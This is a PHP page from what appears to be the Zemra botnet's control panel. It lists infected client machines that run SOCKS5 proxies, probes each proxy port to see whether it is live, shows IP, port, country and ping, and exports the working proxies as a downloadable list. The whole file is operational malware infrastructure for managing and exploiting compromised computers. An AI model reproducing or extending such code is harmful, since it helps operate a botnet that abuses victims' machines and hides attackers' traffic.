<?php
	/* Copyright © 2012 by Chrystal */
	
	if(!defined('__CP__')) { die(); }
	
	class Template_Socks5
	{
		private $Content = NULL;
		private $Title = 'Socks Center';
		
		public function __construct()
		{
			global $Base;
			global $DB;
			
			if (!empty($_GET['export']))
			{
				$FileData = null;
				$Query = $DB->Query("SELECT * FROM clients WHERE Request > '" . (time() - ST_BOT_TIME_ON) . "' AND Socks > 0 ORDER BY Country ASC, CAST(Rate as UNSIGNED) ASC;");
				
				while($Data = $DB->GetRowArray($Query))
				{
					if(($fSocket = @fsockopen($Data['IP'], intval($Data['Socks']), $errno, $errstr, 1)))
					{
						if (empty($Data['Country'])) { $Data['Country'] = '00'; }
						$FileData .= "{$Data['Country']} - {$Data['IP']}:{$Data['Socks']}\r\n";
						@fclose($fSocket);
					}
				}
				
				if (!$FileData)
				{
					header('Location: ?q=socks5&export=0');
					return;
				} else {
					header('Content-type: plain/text');
					header('Content-Disposition: attachment; filename="ZEMRA_SOCKSLIST.txt"');
					header("Content-Transfer-Encoding: binary");
					header("Pragma: no-cache");
					
					ob_end_clean();
					die($FileData);
				}
			} elseif (isset($_GET['export']) && empty($_GET['export'])) {
				$this->Content .= ('<div class="notification error">No Socks for export present !</div>');
			}
			
			$this->Content .= ('<center>
				<table style="width:900px;">
					<tr>
						<td width="30%"><b>UID</b></td>
						<td width="15%"><b>IP</b></td>
						<td width="9%"><b>Port</b></td>
						<td width="38%"><b>Country</b></td>
						<td width="8%"><b>Ping Rate</b></td>
					</tr>');
			
			$Count = $DB->NumRows($DB->Query("SELECT * FROM clients WHERE Request > '" . (time() - ST_BOT_TIME_ON) . "' AND Socks > 0;"));
			if(isset($_GET['page']) && (intval($_GET['page']) - 1) * ST_SHOW_COUNT < $Count && intval($_GET['page']) >= 1)
			{
				$Page = intval($_GET['page']);
				$Limit = ($Page - 1) * ST_SHOW_COUNT . ',' . ST_SHOW_COUNT;
			} else {
				$Page = 1;
				$Limit = '0,' . ST_SHOW_COUNT;
			}
			
			$Query = $DB->Query("SELECT * FROM clients WHERE Request > '" . (time() - ST_BOT_TIME_ON) . "' AND Socks > 0 ORDER BY Country ASC, CAST(Rate as UNSIGNED) ASC LIMIT " . $Limit . ";");		
			$this->Content .= '<div style="float: left; font-weight: bold; display: inline;">' . (($Count > 0) ? "Socks Available ({$Count})" : "No Socks Available") . '</div>';
			$this->Content .= '<div style="float: right; display: inline;"><a href="?q=socks5&export=1">Export List</a></div><div style="padding: 15px;"></div>';
			
			while($Data = $DB->GetRowArray($Query))
			{
				$this->Content .=
								('
								<tr>
									<td>' . $Data['UID'] . '</td>
									<td>' . $Data['IP'] . '</td>
									<td>' . $Data['Socks'] . '</td>
									<td><img src="resources/flags/' . strtolower(($Data['Country'] ? $Data['Country'] : '00')) . '.gif">&nbsp;' . ($Base->GetCountryName($Data['Country']) . ' (' . ($Data['Country'] ? $Data['Country'] : '??') . ')') . '</td>
										' . (($Data['Rate'] < 0 || $Data['Rate'] > 500)  ? ('<td style="color: #EA2438;">') : (($Data['Rate'] < 501 && ($Data['Rate'] > 200)) ? ('<td style="color: #E16D07;">') : ('<td style="color: #429705;">')))
											. ($Data['Rate'] < 0 ? '???' : $Data['Rate']) . ' ms</td>
								</tr>');
			}
			
			$this->Content .= ('</table>');
			
			if($Count > ST_SHOW_COUNT)
			{
				$this->Content .= '<div style="text-align:right;padding-right:10px;padding-top:10px;">';
				if($Page != 1) { $this->Content .= '<a href="?q=socks5&page=' . ($Page - 1) . '" class="button"><span>&laquo; Back</span></a>'; }
				if($Page != ceil($Count / ST_SHOW_COUNT)) { $this->Content .= '<a href="?q=socks5&page=' . ($Page + 1) . '" class="button"><span>Next &raquo;</span></a>'; }
				$this->Content .= '</div>';
			}
		}
		
		public function GetContent()
		{
			return $this->Content;
		}
		
		public function GetTitle()
		{
			return $this->Title;
		}
	}
?>